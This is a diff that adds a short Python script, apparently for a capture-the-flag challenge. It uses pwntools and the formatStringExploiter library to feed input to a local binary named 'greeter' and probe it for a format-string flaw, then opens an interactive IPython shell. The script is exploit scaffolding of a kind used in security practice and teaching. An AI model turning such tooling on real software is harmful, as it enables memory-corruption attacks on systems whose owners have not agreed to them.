@@ -1,0 +1,21 @@
+#!/usr/bin/env python
+
+from formatStringExploiter.FormatString import FormatString
+from pwn import *
+import IPython
+import logging
+
+fName = "./greeter"
+
+elf = ELF(fName)
+
+def exec_fmt(s):
+    p = process(fName,bufSize=0xffff)
+    p.sendline(s)
+    p.recvuntil("Pwn harder, ",drop=True)
+    return p.recvall()
+
+fmtStr = FormatString(exec_fmt,elf=elf)
+
+IPython.embed()
+
